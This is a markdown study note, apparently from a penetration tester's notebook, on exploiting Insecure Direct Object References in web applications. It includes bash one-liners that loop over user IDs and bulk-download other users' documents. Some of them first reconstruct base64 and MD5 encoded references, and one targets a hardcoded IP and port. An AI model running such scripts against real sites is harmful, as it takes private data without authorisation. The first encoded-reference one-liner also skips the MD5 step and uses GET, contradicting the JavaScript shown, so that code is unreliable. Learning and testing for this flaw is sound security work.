---
Primary_category: "[[IDOR]]"
title: "IDOR - INFORMATION DISCLOSURE"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[IDOR]]

#### *Insecure Parameters*

In addition to a poor *access control list* or its absence, a web application may expose direct references to certain objects, such as *user IDs* or documents and so on

Imagine we have signed up for a website and subsequently logged in. We are presented with a webpage that displays information related to our current user, such as documents and so on

From there, we are able to download the existing files and carry out another actions. However, we realize that there is a certain parameter within the *URL* of the given webpage

```bash
https://www.domain.com/documents.php?uid=1
```

What if we change the value of the *uid* parameter?

If the web application has a solid access control system, we should get an access denied error or something similar as we are trying to access resources of other users

However, when we change the value and request the page again, we receive another different resources, which means that we have access to unauthorized resources

---

#### *Bypassing Encoded References*

Usually web applications make hashes or encode their object references, making enumeration more difficult

However, an operator may be able to figure out how the given hashed or encoded value is obtained

##### *Function Disclosure*

Furthermore, a web developer may add some *javascript* functions that perform certain actions before sending the data to the backend server, such as preparing the data or modifying its structure

For instance, let's suppose we have access to an employee portal where our documents are stored and we can download it

When we click the download button, a *POST* request is sent to */download.php*. It only sends one parameter called *UID* whose value seems to be an *MD5* hash

Since we do not know how this hash is obtained, there is not much we can do, it appears to be a well secure object reference

However, as mentioned, a web developer has add a *javascript* function which modifies the *POST* parameter value before sending the request. Since we can read its code, we see that it performs the following actions

```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

First, it *base64-encodes* the provided value and then extract its *MD5* hash before send the *POST* request to */download.php*

Bearing this in mind, we can proceed with the ***[[#Mass Enumeration]]***

---

#### *Mass Enumeration*

Once we discover an *IDOR* and we know the object reference, there are many ways we can automate the data retrieval

##### *IDOR - Plain Reference*

> ***e.g. <URL\>?uid=1***

Continuing with the example of [[#Insecure Parameters|this]] section, we can retrieve the data of the first 20 users as follows

> [!DANGER]- *1st Oneliner*
>
> ```bash
> while IFS= read -r _resource
> do
> 	curl \
> 		--silent \
> 		--location \
> 		--request GET \
> 		"http[s]://<TARGET>:<PORT>/${_resource#/}" \
> 		--output "${_resource##*/}"
> done < <(
> 			for _uid in {1..20}
> 			do
> 				curl \
> 					--silent \
> 					--location \
> 					--request POST \
> 					--data "uid=$_uid" \
> 					"http[s]://<TARGET>:<PORT>/documents.php" \
> 				| grep -iPo --color -- "href='\K/documents/.*?(?=')"
> 			done
> 		)
> ```
>

> [!DANGER]- *2nd Oneliner*
>
> ```bash
> url="http://SERVER_IP:PORT"
> 
> for i in {1..10}; do
>         for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
>                 wget -q $url/$link
>         done
> done
> ```

##### *IDOR - Encoded | Hashed Reference*

> ***e.g. <URL\>?uid=<ENCODED_OR_HASHED_VALUE\>***

Continuing with the example of ***[[#Bypassing Encoded References|this]]*** section, we can proceed as folllows

> [!DANGER]- *1st Oneliner*
>
> ```bash
> while IFS= read -r _contract
> do
>     curl \
>     --silent \
>     --location \
>     --request GET \
>     "http://154.57.164.76:30413/download.php?contract=$_contract"
> 
> done < <(
>             for _number in {1..20}
>             do
>                 echo -n "$_number" | base64 -w 0 ; echo
>             done
>         )
> ```
> 
>

> [!DANGER]- *2nd Oneliner*
>
> ```bash
> for i in {1..10}; do
>     for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
>         curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
>     done
> done
> ```
> 
>